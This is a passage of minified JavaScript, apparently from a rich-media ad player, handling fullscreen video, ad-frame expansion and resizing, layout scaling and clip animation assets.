        b = 0;
        if (Tf[a]) try {
          b = d.contentWindow.getPlayhead();
        } catch (e) {}
        return b;
      }
      if (Tf[a]) try {
        d.contentWindow.postMessage({
          m: "cmd",
          c: b,
          v: "setVolume" === b ? bc(c) : c
        }, "*");
      } catch (e) {} else Vd[a] || (Vd[a] = []), Vd[a].push([b, c]);
    },
    te = function (a, b, c, d) {
      var e = B[a],
        g = e[58],
        f = D[a],
        k = f[4];
      a = aa[a];
      if ("status" === b) {
        e[22] = c;
        e[23] = d;
        if (3 === c || 9 === c) e[34] && 9 !== e[22] && Wf(g, 1), 1 === g && Ka(g, 2);
        k && (xa(f[5], 1 !== c), xa(f[6], 1 === c));
      } else "setPlayhead" === b && (k && (k.ccSetPlayhead(c), 0 < c && !e[33] && (xa(k, !0), Rd && (k.style.opacity = 1), k.ccCount = 20, k.ccTimer = ma(k.ccHide, 1500), e[33] = !0)), a.progress && (f[10].style.width = 100 * c + "%"));
    },
    ve = function (a, b) {
      var c = D[a],
        d = c[0],
        e = c[1],
        g = c[4],
        f = c[2],
        k = B[a],
        h = k[58],
        m = "canvas" === ab(a),
        l,
        n;
      if (0 <= qa && b) {
        if (qa === h) return;
        ve(qa, !1);
      }
      m || (l = "IFRAME" === f.tagName);
      Na ? (C.activeElement === Na && (n = !0), db(Na), Na = null) : b && c[7] && C.activeElement === c[7] ? n = !0 : !b && c[8] && C.activeElement === c[8] && (n = !0);
      f && f.previousSibling && "ccp" === f.previousSibling.id && (f.previousSibling.style.display = b ? "none" : "block");
      if (b) {
        !M || pd || Qb || "expanded" === M || uc || (uc = ae = !0, G.setExpandProperties({
          useCustomClose: !0
        }), G.expand());
        try {
          if (top !== u && top.alert) {
            var q = u.frameElement.style;
            var r = top.document.body.style;
            ja[2] = q.position;
            ja[3] = q.opacity;
            ja[4] = q.zIndex;
            ja[6] = q.top;
            ja[7] = q.left;
            ja[8] = q.width;
            ja[9] = q.height;
            ja[10] = r.overflow;
            q.setProperty("position", "fixed", "important");
            q.setProperty("opacity", "1", "important");
            q.setProperty("z-index", "2147483646", "important");
            q.setProperty("top", "0px", "important");
            q.setProperty("left", "0px", "important");
            q.setProperty("width", "100%", "important");
            q.setProperty("height", "100%", "important");
            r.setProperty("overflow", "hidden", "important");
            ja[1] = !0;
          }
        } catch (t) {}
        qa = h;
        qb();
        b = 1 === ua ? .5 : 1 / Ab;
        g ? (g.ccScale(b), n && c[8] && we(c[8])) : (g = wa[a], c = g[3], q = g[4], g = 30, c * Z > R * q && (g += Math.round((Z - q * R / c) / 2)), Na = ta(), c = Na.style, c.width = "44px", c.height = "40px", c.padding = "10px", c.bottom = g + "px", c.right = "30px", c.position = "absolute", c.cursor = "pointer", c.opacity = .7, c.borderRadius = "10px", c.backgroundColor = "#000000", c.backgroundRepeat = "no-repeat", c.backgroundPosition = "center center", c.backgroundImage = "url('data:image/svg+xml;charset=utf-8,%3csvg%20xmlns%3asvg%3d%22http%3a%2f%2fwww.w3.org%2f2000%2fsvg%22%20xmlns%3d%22http%3a%2f%2fwww.w3.org%2f2000%2fsvg%22%20version%3d%221.1%22%20width%3d%2244%22%20height%3d%2240%22%3e%3cpath%20d%3d%22m25%200c-1.65685%200-3%201.343146-3%203l0%2014c0%201.656854%201.34315%203%203%203l14%200c1.65685%200%203-1.343146%203-3%200-1.656854-1.34315-3-3-3l-6.75%200%208.875-8.875C41.66789%204.582107%2042%203.828427%2042%203c0-1.656854-1.34315-3-3-3-0.82842%200-1.5821%200.332106-2.125%200.875L28%209.75%2028%203c0-1.656854-1.34315-3-3-3z%22%20fill%3d%22%23fff%22%2f%3e%3cpath%20d%3d%22m19%2040c1.65685%200%203-1.34315%203-3l0-14c0-1.65685-1.34315-3-3-3l-14%200c-1.65685%200-3%201.34315-3%203%200%201.65685%201.34315%203%203%203l6.75%200-8.875%208.875C2.33211%2035.41789%202%2036.17157%202%2037c0%201.65685%201.34315%203%203%203%200.82842%200%201.5821-0.33211%202.125-0.875L16%2030.25%2016%2037c0%201.65685%201.34315%203%203%203z%22%20fill%3d%22%23fff%22%2f%3e%3c%2fsvg%3e')", yd(Na, "scale(" + b + ") translateZ(0)", "right bottom"), Aa(Na, "click", function () {
          Fa(qa, "fullscreenoff", null, !0);
        }), Q(Na, "keydown", Xg), P(e, Na), n && we(Na));
        Q(u, "orientationchange", zd);
        Q(screen, "mozorientationchange", zd);
        Zd = d.parentNode;
        $d = d.nextSibling;
        l || P(la, d);
        for (e = f; e;) {
          b = e.style;
          e.ccStyle = b.cssText;
          b.overflow = "visible";
          b.clip = "auto";
          b.top = b.left = "0px";
          e === f && f.ccogv ? b.position = "absolute" : b.width = b.height = "100%";
          e === f && (b.objectFit = "contain");
          e === f && m && (n = R * f.height, c = f.width * Z, n < c ? (b.height = "auto", b.top = 50 * (1 - n / c) + "%") : (b.width = "auto", b.left = 50 * (1 - c / n) + "%"));
          if (e === d) {
            b.position = 0 < (I & 390) && !l ? "absolute" : "fixed";
            b.zIndex = 7E6;
            yd(e, "", "");
            1 !== I && (b.width = "100vw", b.height = "100%");
            m && (b.backgroundColor = "#000");
            break;
          }
          e = e.parentNode;
        }
        f.ccogv && f.setSize(u.innerWidth + 1, u.innerHeight + 1, !0);
        $f(h, !1);
        k[20] = Math.max(la.scrollLeft, Va.scrollLeft);
        k[21] = Math.max(la.scrollTop, Va.scrollTop);
        u.scrollTo(0, 0);
        Q(u, "keydown", ag);
        Q(d, "touchstart", bg);
      } else {
        try {
          ja[1] && (q = u.frameElement.style, r = top.document.body.style, q.position = ja[2], q.opacity = ja[3], q.zIndex = ja[4], q.top = ja[6], q.left = ja[7], q.width = ja[8], q.height = ja[9], r.overflow = ja[10], ja = []);
        } catch (t) {}
        qa = -1;
        l || P(Zd, d, $d);
        Zd = $d = null;
        for (e = f; e;) {
          b = e.style;
          if (!b) break;
          e.ccStyle && (b.cssText = e.ccStyle);
          if (e === d) break;
          e = e.parentNode;
        }
        $f(h, !0);
        u.scrollTo(k[20], k[21]);
        $b(u, "keydown", ag);
        $b(d, "touchstart", bg);
        k[4] = "";
        Oa(h, !0);
        n && c[7] && we(c[7]);
        "expanded" === M && ae && !vc && (ae = !1, od = vc = !0, G.close());
      }
      f.ccogv || 1 !== k[22] || cc(f, a);
    },
    $f = function (a, b) {
      var c;
      b = b ? "block" : "none";
      if (a = [, [2, 3]][a]) for (c = 0; c < a.length; c++) {
        var d = ba[a[c]];
        ea[d][0] && (D[d][0].style.display = b);
      }
    },
    we = function (a) {
      ma(function () {
        a && a.focus();
      }, 1);
    },
    ag = function (a) {
      27 === a.keyCode && Fa(qa, "fullscreenoff", null, !0);
    },
    bg = function (a) {
      a.preventDefault();
    },
    zd = function (a) {
      if (0 <= qa) {
        var b = D[qa];
        a = b[4];
        b = b[3];
        b.ccogv && b.setSize(u.innerWidth + 1, u.innerHeight + 1, !0);
        a && ma(function (c) {
          0 <= qa && c.ccScale(1 === ua ? .5 : 1 / Ab);
        }, 9 <= fb ? 1 : 500, a);
        u.scrollTo(0, 0);
      }
    },
    qe = function (a) {
      var b,
        c = [1, 4];
      for (b = 0; b < c.length; b++) {
        var d = c[b];
        var e = ba[d];
        d = B[d];
        var g = ea[e];
        a ? 1 === d[22] && (Fa(e, "pause", null, !1), d[22] = 8) : 8 === d[22] && (g[0] ? (Fa(e, "play", null, !1), d[22] = 1) : d[22] = 2);
      }
    },
    cg = [{
      w: 640,
      h: 360,
      color: "rgba(0,0,0,1)"
    }],
    Tg = function (a) {
      var b = D[a];
      var c = cg[a];
      var d = ta();
      var e = d.style;
      void 0 !== c.color && (e.backgroundColor = c.color);
      void 0 !== c.borderWidth && (e.borderWidth = c.borderWidth + "px", e.borderColor = c.borderColor, e.borderStyle = "solid");
      b[2] = d;
      dg(a, c.w, c.h);
      P(b[1], d);
    },
    dg = function (a, b, c) {
      var d = D[a];
      a = cg[a];
      void 0 !== a.borderWidth && (b -= 2 * a.borderWidth, c -= 2 * a.borderWidth);
      try {
        var e = d[2].style;
        e.width = b + "px";
        e.height = c + "px";
      } catch (g) {}
    },
    ec = {
      x: 0,
      y: 0
    },
    Ic = !1,
    Jc,
    pa = [],
    lc = {},
    ng;
  pa[4] = {
    endTime: 0,
    loadCount: 3,
    origStatus: {
      m: [1, 0, -1, -1, 0, 1, null, 0]
    },
    clipData: [{
      instances: ["m"],
      borderColor: "rgba(229, 60, 46, 1)",
      loop: 1,
      borderWidth: 0,
      bgOpacity: 1,
      loopDelay: 0,
      endTime: 0,
      objectList: [{
        motionList: [{
          y: 110,
          skewX: 0,
          x: 248,
          alpha: 1,
          anchorY: 94,
          skewY: 0,
          time: 0,
          rotation: 0,
          easing: Nd,
          scaleY: .65,
          anchorX: 95,
          type: 1,
          scaleX: .65
        }],
        pd: 1,
        id: 1,
        height: 188,
        width: 190,
        maxScale: 65,
        assetLid: 4,
        url: "clipcentric-a.akamaihd.net/file/1655406/ad_q50/1691517510/KjmlhU3O?f=auto"
      }, {
        width: 640,
        height: 360,
        url: "clipcentric-a.akamaihd.net/file/1687070/master/1696276962/auvvFXmm?f=auto",
        assetLid: 4,
        maxScale: 100,
        motionList: [{
          alpha: 1,
          anchorY: 180,
          y: 0,
          skewX: 0,
          x: 0,
          time: 0,
          skewY: 0,
          type: 1,
          scaleX: 1,
          easing: Nd,
          anchorX: 320,
          rotation: 0,
          scaleY: 1
        }],
        pd: 1,
        id: 2
      }, {
        motionList: [{
          easing: Nd,
          scaleY: 1,
          rotation: 0,
          anchorX: 321,
          scaleX: 1,
          type: 1,
          skewX: 0,
          x: 0,
          y: 2,
          anchorY: 178,
          alpha: 1,
          skewY: 0,
          time: 0
        }],
        isSvg: 1,
        id: 3,
        svg: '<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="641" height="356" viewBox="0 0 641 356" preserveAspectRatio="none"><defs><linearGradient x1="0" y1="199.36" x2="641" y2="356" gradientUnits="userSpaceOnUse" id="color-1"><stop offset="0" stop-color="#e55b35"/><stop offset="0.48" stop-color="#e53c2e"/><stop offset="1" stop-color="#e52e50"/></linearGradient></defs><g fill="url(#color-1)" fill-rule="nonzero" stroke="#000000" stroke-width="0" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><path d="M0,356v-356h641v356z" id="n76"/></g></svg>',
        height: 356,
        width: 641,
        assetLid: 4,
        maxScale: 100
      }],
      bgColor: "rgba(255, 255, 255, 1)",
      width: 640,
      maskInfo: [{}, {}, {}],
      height: 360
    }]
  };
  var Fc = function (a) {
      try {
        var b = X.geom();
      } catch (c) {}
      b || (b = {});
      b.win || (b.win = {});
      b.self || (b.self = {});
      b.exp || (b.exp = {});
      isNaN(b.win.w) && (b.win.w = self.innerWidth);
      isNaN(b.win.h) && (b.win.h = self.innerHeight);
      isNaN(b.self.l) && (b.self.l = 0);
      isNaN(b.self.t) && (b.self.t = 0);
      isNaN(b.exp.l) && (b.exp.l = 0);
      isNaN(b.exp.r) && (b.exp.r = 0);
      isNaN(b.exp.t) && (b.exp.t = 0);
      isNaN(b.exp.b) && (b.exp.b = 0);
      b.self.t -= 0;
      b.self.b -= 0;
      b.self.l -= 0;
      b.self.r -= 0;
      eg && !a && (b.self.l = fg, b.self.t = gg);
      return b;
    },
    Bf = function (a) {
      "collapsed" === a && Rb ? (fa = Rb, Rb = null, a = Fc(), fa.expmax = {
        l: a.exp.l,
        r: a.exp.r,
        t: a.exp.t,
        b: a.exp.b
      }, fa.l = Math.min(fa.l, a.exp.l), fa.t = Math.min(fa.t, a.exp.t), fa.r = Math.min(fa.r, a.exp.r), fa.b = Math.min(fa.b, a.exp.b), Bb = self.innerWidth, yc = self.innerHeight, (0 < fa.l || 0 < fa.t || 0 < fa.r || 0 < fa.b) && X.expand(fa)) : "failed" === a && (uf = !0, me());
    },
    Zg = function () {
      if (G) try {
        G.getMaxSize || (G.getMaxSize = se), G.getScreenSize || (G.getScreenSize = function () {
          return {
            width: screen.width,
            height: screen.height
          };
        }), G.getDefaultPosition || (G.getDefaultPosition = function () {
          var a = G.getMaxSize();
          a.x = a.y = 0;
          return a;
        }), G.getCurrentPosition || (G.getCurrentPosition = G.getDefaultPosition), G.setResizeProperties || (G.setResizeProperties = function () {});
      } catch (a) {}
    },
    xe = function () {
      1 > self.innerHeight && 1 > self.innerWidth || ($b(self, "resize", xe), Xa || (Xa = !0, wd()));
    },
    td = function () {
      if (!kd) {
        kd = !0;
        Zg();
        hg();
        G.addEventListener("stateChange", $g);
        G.addEventListener("viewableChange", ah);
        parseInt(G.getVersion());
        M = G.getState();
        0 < (I & 1560) && (Q(self, "resize", xe), ma(xe, 100));
        G.isViewable() || Xa ? (Xa = !0, wd()) : G.addEventListener("exposureChange", bh);
        var a;
        for (a = 0; a < Gc.length; a++) cc(Gc[a][0], Gc[a][1]);
        Gc = [];
      }
    },
    $g = function (a) {
      var b = "expanded" === M && "default" === a && !od;
      "expanded" === a ? uc = !1 : "default" === a && (vc = !1);
      0 <= qa && ("expanded" === M ? (b = !1, Fa(qa, "fullscreenoff", null, !1)) : zd());
      M = a;
      if (Fb) {
        if (b) {
          pd = !0;
          for (b = 1; 5 >= b; b++) {
            try {
              Ka(b, 2);
            } catch (c) {}
            ea[b][4] = !1;
          }
          b = ba[0];
          "canvas" === ab(b) && (Ge(b), Pc(b));
          Xb();
          pd = !1;
        }
        Xb();
        b = D[ba[0]][0].style;
        "expanded" !== a && (b.marginLeft = "calc(50vw - " + parseInt(b.width) / 2 + "px)");
        od = !1;
      }
    },
    ah = function (a) {
      var b = !(a || uc || /expanded|resized/i.test(M));
      a && !Xa && (Xa = !0, wd());
      qe(b);
      Md(b);
    },
    bh = function (a, b, c) {
      0 < a && (Xa || (Xa = !0, wd()), G.removeEventListener("exposureChange"));
    },
    se = function () {
      return {
        width: Math.max(u.innerWidth, la.clientWidth, Va.clientWidth),
        height: Math.max(u.innerHeight, la.clientHeight, Va.clientHeight)
      };
    },
    hg = function () {
      try {
        var a = "interstitial" === G.getPlacementType();
      } catch (b) {}
      a ? Qb = !0 : 0 < Z && (a = se(), Qb = a.width * a.height >= .9 * R * Z);
    },
    Pf = function (a) {
      var b = {
        x: 0,
        y: 0,
        width: u.innerWidth,
        height: u.innerHeight
      };
      if (G) try {
        var c = G.getCurrentPosition();
        b.x = c.x;
        b.y = c.y;
        b.width = c.width;
        b.height = c.height;
      } catch (d) {}
      b.width && b.height || (b.width = u.innerWidth, b.height = u.innerHeight);
      eg && !a && (b.x = fg, b.y = gg);
      return b;
    },
    Qf = function () {
      var a = {};
      if (G) try {
        a = G.getMaxSize();
      } catch (b) {}
      a && a.width || (a = {
        width: u.innerWidth,
        height: u.innerHeight
      });
      return a;
    },
    fg = 0,
    gg = 0,
    eg,
    ud = function (a) {
      if (md && !a) try {
        md();
      } catch (m) {}
      a = [1];
      var b = {
          1: 0
        },
        c;
      if (U && xc) return Math.round(U.h + U.y);
      Fb || (qb(), ee(), Ec(), fe());
      var d = 0;
      xc = !0;
      for (c = 0; c < a.length; c++) {
        var e = a[c];
        if (e === ba[e]) {
          nd[e] || (xc = !1);
          var g = Oa(e, !1);
          for (e = b[e]; void 0 !== e;) {
            var f = ba[e];
            !nd[f] && 0 < e && (xc = !1);
            var k = "left" === g.hp ? g.left : g.ow - g.width - g.right;
            var h = "right" !== g.vp ? g[g.vp] : g.oh - g.height - g[g.vp];
            f = Oa(f, !1);
            f.width = Math.max(f.width, k + g.width);
            f.height = Math.max(f.height, h + g.height);
            g = f;
            e = b[e];
          }
          d = Math.max(d, g.height || 0);
        }
      }
      U && xc ? d = Math.round(U.h + U.y) : 0 >= d && (e = ba[0], d = wa[e][4]);
      return d;
    },
    Ag = function (a) {
      var b = ud(!0);
      a = a.replace(/\?height=\d+/, "?height=" + b);
      return Pb.notify(a);
    },
    ye = function () {
      var a,
        b = 0,
        c = 0,
        d;
      if (nb) {
        var e = ba[0];
        var g = D[e][0];
        var f = g.style;
        var k = g.getBoundingClientRect();
        var h = B[e];
        var m = d = parseInt(f.width) || h[5];
        var l = h = parseInt(f.height) || h[6];
        for (a = 0; 5 >= a; a++) if (a === ba[a] && a !== e) {
          var n = wa[a];
          var q = ea[a];
          if ((q[0] || q[3]) && n && !("number" === typeof n[10] && 0 < n[10] && null === n[12]) && (n = (n = D[a]) && n[0])) {
            q = n.getBoundingClientRect();
            n = q.left - k.left;
            var r = q.top - k.top;
            var t = q.right - q.left;
            q = q.bottom - q.top;
            0 < t && 0 < q && (n < b && (b = n), r < c && (c = r), n + t > d && (d = n + t), r + q > h && (h = r + q));
          }
        }
        if (!U || U.x !== b || U.y !== c || U.w !== d || U.h !== h || U.iw !== m || U.ih !== l || void 0 !== U.v) {
          k = 0 > b || 0 > c || d > m || h > l ? 900 : !1;
          if (!1 !== k) {
            if (U && U.p) {
              var p = U.p;
              var y = U.z;
            } else for (p = [], y = []; g && g.offsetWidth < 1.2 * d && g.offsetHeight < 1.2 * h;) p.push(g.style), y.push(g.style.zIndex), g = g.offsetParent;
            for (g = 0; g < p.length; g++) p[g].zIndex !== k && (p[g].zIndex = k);
          } else if (U && U.p) for (p = U.p, y = U.z, g = 0; g < p.length; g++) p[g].zIndex !== y[g] && (p[g].zIndex = y[g]);
          g = U;
          U = {
            x: b,
            y: c,
            w: d,
            h: h,
            iw: m,
            ih: l,
            v: void 0,
            p: p,
            z: y
          };
          g || (g = U, g.w = -1);
          M && G && hg();
          if (X) {
            if (q = {}, p = Fc(), n = Math.ceil((Bb - m) / 2), m = p.exp.r + Bb - d, y = -p.exp.l - b, m < y ? n = Math.round((m - y) / 2) : n > m ? n = m : n < y && (n = y), b += n, d += n, m = n, 0 > b && (m += Math.min(-b, p.exp.l)), f.marginLeft = m + "px", d > Bb || h > yc || 0 > b || 0 > c) a: {
              if (q.l = 0 > b ? -b : 0, q.t = 0 > c ? -c : 0, q.r = d > Bb ? d - Bb : 0, q.b = h > yc ? h - yc : 0, f = q, h = ["l", "r", "t", "b", "push"], X) {
                Rb = {};
                for (b = 0; b < h.length; b++) c = h[b], c in f && (Rb[c] = f[c]);
                if (fa) {
                  d = fa.expmax;
                  for (b = 0; 4 > b; b++) if (c = h[b], Math.min(f[c], d[c]) !== fa[c]) {
                    var w = !0;
                    break;
                  }
                  f.push !== fa.push && (w = !0);
                  if (!w) break a;
                }
                w = X.status();
                "collapsed" === w ? Bf(w) : /exp/.test(w) && X.collapse();
              }
            } else /col/.test(X.status()) || (fa = Rb = null, X && X.collapse(), f.marginLeft = f.marginTop = "0px");
          } else !M || !G || pd || Qb && !/expanded|resized/i.test(M) || ((f.marginLeft = "calc(50vw - " + U.iw / 2 + "px)", !ld || uc || /expanded|resized/i.test(M)) ? d <= m && h <= l && 0 <= b && 0 <= c && /expanded|resized/i.test(M) && !vc && (od = vc = !0, G.close()) : nb && ((w = ud(!0), Pb) ? (wc || (wc = $a("mggs/:m/boliaesdg.oolg.eoc/moctnneHtiehg?tehgith=")), Pb.notify(wc + w)) : (!mb && (mb = C.querySelector($a("G#DAeRlfwoeMssneegr"))) && (mb.srcdoc = "", mb = C.createElement("iframe"), mb.style.display = "none", P(la, mb), wc = $a("mggs/:m/boliaesdg.oolg.eoc/moctnneStzi?eehgith=")), mb && (mb.src = wc + w))));
        }
      }
    },
    Oa = function (a, b, c) {
      var d = wa[a],
        e,
        g = [],
        f = [],
        k = [],
        h = [],
        m = [],
        l = [],
        n = [],
        q = [],
        r = [],
        t = [];
      var p = {};
      if (d) {
        var y = d[5];
        var w = d[6];
        var v = d[10];
        var z = d[15];
        var ca = d[16];
        var A = d[1];
        var E = d[2];
        var S = ab(a);
        var V = a;
        var J = B[a];
        var N = (e = D[a]) && e[0];
      } else return p;
      if (c) {
        if (5 < c) return p;
        c++;
      } else c = 1;
      var ka = 0 === a;
      if (qa === a) return {
        sx: 1,
        sy: 1,
        width: R,
        height: Z
      };
      var H = d[3];
      var W = d[4];
      if ("number" === typeof v) {
        v = ba[v];
        var O = t[v] = Oa(v, !1, c);
        g[0] = O.width;
        g[1] = O.height;
      } else if ("dom" === v) {
        var x = N && N.parentNode;
        for (g[0] = g[1] = 0; x;) if (g[0] = x.clientWidth, g[1] = x.clientHeight, 0 >= g[0]) x = x.parentNode;else break;
        0 >= g[0] && (g[0] = H);
        0 >= g[1] && (g[1] = W);
      } else ka ? (g[0] = Ya, g[1] = Za) : (g[0] = R, g[1] = cd);
      h[0] = h[1] = "original";
      m[0] = m[1] = 0;
      l[0] = l[1] = Number.MAX_VALUE;
      if ("independent" === y) h[0] = w[0], n[0] = w[1], q[0] = w[2], /^(view|page|container|layer)$/.test(h[0]) && (m[0] = w[3], l[0] = w[4]), h[1] = w[7], n[1] = w[8], q[1] = w[9], /^(view|viewmax|page|container|layer)$/.test(h[1]) && (m[1] = w[10], l[1] = w[11]);else if ("withparent" === y) h[0] = h[1] = y;else if (/^(bestfit|exactfit|cover)$/.test(y)) {
        var rb = !0;
        x = w[0];
        /(view|container|adslot)/.test(x) ? h[0] = h[1] = x : "number" === typeof x && (h[0] = h[1] = "layer", q[0] = q[1] = x);
        n[0] = n[1] = 100;
        m[0] = w[5];
        l[0] = w[6];
        m[1] = w[7];
        l[1] = w[8];
        "exactfit" !== y && (m[0] = Math.max(m[0], m[1] * H / W), m[1] = Math.max(m[1], m[0] * W / H), l[1] && l[0] ? (l[0] = Math.min(l[0], l[1] * H / W), l[1] = Math.min(l[1], l[0] * W / H)) : l[1] ? l[0] = l[1] * H / W : l[1] = l[0] * W / H);
      }
      for (x = 0; 2 > x; x++) if ("view" === h[x]) r[x] = 0 === x ? R : Z;else if ("viewmax" === h[x]) r[x] = 0 === x ? R : cd;else if ("page" === h[x]) r[x] = void 0;else if ("container" === h[x]) r[x] = g[x];else if ("adslot" === h[x]) r[x] = void 0;else if ("layer" === h[x]) {
        q[x] = ba[q[x]];
        var Kb = t[q[x]] ? t[q[x]] : t[q[x]] = Oa(q[x], !1, c);
        r[x] = 0 === x ? Kb.width : Kb.height;
      }
      "independent" === y && (/^(view|page|container|layer)$/.test(h[0]) && (r[0] = "px" === w[6] ? r[0] - w[5] : r[0] * (1 - w[5] / 100)), /^(view|viewmax|page|container|layer)$/.test(h[1]) && (r[1] = "px" === w[13] ? r[1] - w[12] : r[1] * (1 - w[12] / 100)));
      rb && (r[0] = "px" === w[2] ? r[0] - w[1] : r[0] * (1 - w[1] / 100), r[1] = "px" === w[4] ? r[1] - w[3] : r[1] * (1 - w[3] / 100), /^(bestfit|cover)$/.test(y) && (H * r[1] > r[0] * W ? h["bestfit" === y ? 1 : 0] = "keepaspect" : h["bestfit" === y ? 0 : 1] = "keepaspect"));
      f[0] = k[0] = H;
      f[1] = k[1] = W;
      for (x = 0; 2 > x; x++) "fixed" === h[x] ? f[x] = n[x] : "withparent" === h[x] && O ? (f[x] *= 0 === x ? O.sx : O.sy, f[x] = Math.round(f[x])) : /^(original|keepaspect)$/.test(h[x]) || (f[x] = Math.round(r[x] * n[x] / 100), f[x] < m[x] && (f[x] = m[x]), l[x] > m[x] && f[x] > l[x] && (f[x] = l[x]));
      c = f[0];
      f = f[1];
      "keepaspect" === h[0] && (c = Math.round((H - 0) * f / (W - 0)));
      "keepaspect" === h[1] && (f = Math.round((W - 0) * c / (H - 0)));
      J[13] = c / H;
      J[14] = f / W;
      p.sx = c / k[0];
      p.sy = f / k[1];
      O && (d[13] && (A *= O.sx), d[14] && (E *= O.sy));
      /left|right/.test(z) || (A = g[0] / 2 - c / 2 + A);
      /top|bottom/.test(z) || (E = g[1] / 2 - f / 2 + E);
      0 < (ca & 1) ? 0 <= z.indexOf("left") ? A = -c - A : 0 <= z.indexOf("right") && (A = g[0] + A) : 0 < (ca & 4) && O ? ((A = D[v]) && A[0] ? v = A[0].getBoundingClientRect() : (v = O, void 0 === v.left && (v.left = v.ow - v.right - v.width)), qb(), A = 0 <= z.indexOf("left") ? d[1] - v.left : 0 <= z.indexOf("right") ? R - c - v.left - d[1] : R / 2 - c / 2 - v.left + d[1]) : 0 <= z.indexOf("right") && (A = g[0] - c - A);
      0 < (ca & 2) ? 0 <= z.indexOf("top") ? E = -f - E : 0 <= z.indexOf("bottom") && (E = g[1] + E) : 0 <= z.indexOf("bottom") && (E = g[1] - f - E);
      p.hp = "left";
      p.vp = "top";
      p.left = A;
      p.top = E;
      p.width = c;
      p.height = f;
      p.ow = g[0];
      p.oh = g[1];
      if (J[72]) {
        N && (v = N.getBoundingClientRect(), p.width = c = v.width, p.height = f = v.height);
        p.sx = p.sy = 1;
        var da = !0;
      }
      if (b) {
        b = c + "|" + f + "|" + A + "|" + E;
        if (J[4] === b) return p;
        J[4] = b;
        J[5] = c;
        J[6] = f;
        J[7] = A;
        J[8] = E;
        J[9] = "left";
        J[10] = "top";
        J[11] = H = c / H;
        J[12] = W = f / W;
        J[17] = O;
        if (da) return p;
        O = N.style;
        da = e[1].style;
        O.width = da.width = c + "px";
        O.height = da.height = f + "px";
        N = N.style;
        N.top = E + "px";
        N.bottom = "auto";
        O.left = A + "px";
        O.right = "auto";
        ka && ye();
        ka = e[2];
        "video" === S && (A = c, N = f, b = aa[V], O = b.ow, da = b.oh, E = D[V][2], d = E.parentNode.style, d.position = "absolute", d.top = "0px", d.left = "0px", d.width = A + "px", d.height = N + "px", z = E.tagName, d = b.crop || {
          t: 0,
          r: 0,
          b: 0,
          l: 0
        }, "VIDEO" === z ? (b = E.style, 0 < d.l || 0 < d.r || 0 < d.t || d.b ? (ca = Math.max(O * (1E3 - d.l - d.r) / 1E3, 10), v = Math.max(da * (1E3 - d.t - d.b) / 1E3, 10), z = ca * N, g = A * v, z === g ? (z = A / ca, da *= z, O *= z, A = -(O * d.l / 1E3), N = -(da * d.t / 1E3)) : z > g ? (z = N / v, da *= z, O *= z, A = -(((1E3 + d.l - d.r) / 1E3 * O - A) / 2), N = -(da * d.t / 1E3), O += 2, --A) : (z = A / ca, O *= z, da *= z, A = -(O * d.l / 1E3), N = -(((1E3 + d.t - d.b) / 1E3 * da - N) / 2), da += 2, --N), b.position = "absolute", b.top = N + "px", b.left = A + "px", b.width = O + "px", b.height = da + "px", E.width = O, E.height = da) : (b.position = "absolute", b.top = "0px", b.left = "0px", b.width = "100%", b.height = "100%")) : "CANVAS" === z && E.setSize(A, N), (e = e[4]) && e.ccScale(1 === ua ? .5 : 1 / Ab));
        if ("canvas" === S) {
          e = Math.ceil(c * La);
          E = Math.ceil(f * La);
          if (e !== ka.width || E !== ka.height) ka.width = e, ka.height = E, Fe(a);
          e = pa[V];
          J[54] && (V = Ib.now(), e.once = !0, e.animateFunc(V));
        }
        "frame" === S && dg(a, c, f);
        a = ff[a];
        S = J[59];
        if (a && S) for (e = 0; e < a.length; e++) J = a[e], V = S[e + 1].style, V.left = J[0] * H + "px", V.top = J[1] * W + "px", V.width = J[2] * H + "px", V.height = J[3] * W + "px", V.borderRadius = J[5] * (H + W) / 2 + "px";
      }
      return p;
    },
    cb = function (a, b, c) {
      var d;
      b = {
        5: 1
      };
      try {
        if (!b[a] && nb) {
          var e = ea[a];
          var g = B[a];
          for (d = wa[a]; 0 < e[20].length;) sa(e[20].pop());
          e[0] || ea[a][4] || (c && Wg(a), 32 !== g[1] ? (g[1] |= 4, c && (g[1] |= 8), (0 === (g[1] & 1) || c) && ie(a)) : (e[0] = !0, e[1] = !1, nd[a] = !0, oa("ls:" + yb[a] + ",li" + (c ? ",ii" : "")), d && (g[58] = a, "canvas" === ab(a) && (pa[a].lid = a), Oa(a, !0)), 1 === a && (g[24] = 0, c || Lc ? Fa(a, "open", null, c) : (sa(g[31]), g[31] = ma(Fa, 1, a, "open", null, c)), ze(a, !0)), 2 === a && (/^http/.test(D[a][2].getAttribute("src")) || (D[a][2].src = bb(d[9])), xa(a, !0)), 3 === a && (/^http/.test(D[a][2].getAttribute("src")) || (D[a][2].src = bb(d[9])), xa(a, !0)), 4 === a && (Pc(a), ze(a, !0)), 1 === a && Ka(4, 2, c), 2 === a && Ka(3, 2, c), 3 === a && Ka(2, 2, c), ye(), Rf(0, a)));
        }
      } catch (f) {}
    },
    Ka = function (a, b, c) {
      try {
        var d = ea[a];
        var e = B[a];
        for (d[5] = !1; 0 < d[19].length;) sa(d[19].pop());
        e[1] &= -13;
        d[0] && (d[0] = !1, d[1] = !1, d[3] = !0, oa("le:" + yb[a]), qa === a && Fa(a, "fullscreenoff", null, !1), 1 === a && (ig(a), xa(a, !1), Hc(a), Ka(2, 2, c), Ka(3, 2, c)), 2 === a && (xa(a, !1), Hc(a)), 3 === a && (xa(a, !1), Hc(a)), 4 === a && (ig(a), xa(a, !1), Hc(a)), 1 === a && (nb && cb(4, 2, c), Ka(2, 2, c), Ka(3, 2, c)));
      } catch (g) {}
    },
    Hc = function (a) {
      var b = ea[a],
        c = ab(a);
      b[3] = !1;
      "video" === c && Fa(a, "close", null, !1);
      "canvas" === c && Ge(a);
      ye();
    },
    ze = function (a, b, c) {
      try {
        var d = D[a][1],
          e = ea[a],
          g = wa[a],
          f = Ea(),
          k = d.style,
          h;
        c || (e[14] ? (sa(e[18]), e[15] = f - (1 - e[17]) * e[16]) : (e[14] = !0, e[15] = f), e[16] = g[b ? 18 : 19], xa(a, !0));
        if (1 === a) {
          e[17] = h = 0 < e[16] ? (f - e[15]) / e[16] : 1;
          1 <= h ? (h = 1, e[14] = !1, b || (Ka(2, 2), Ka(3, 2))) : h = .5 - Math.cos(h * Math.PI) / 2;
          var m = h;
        }
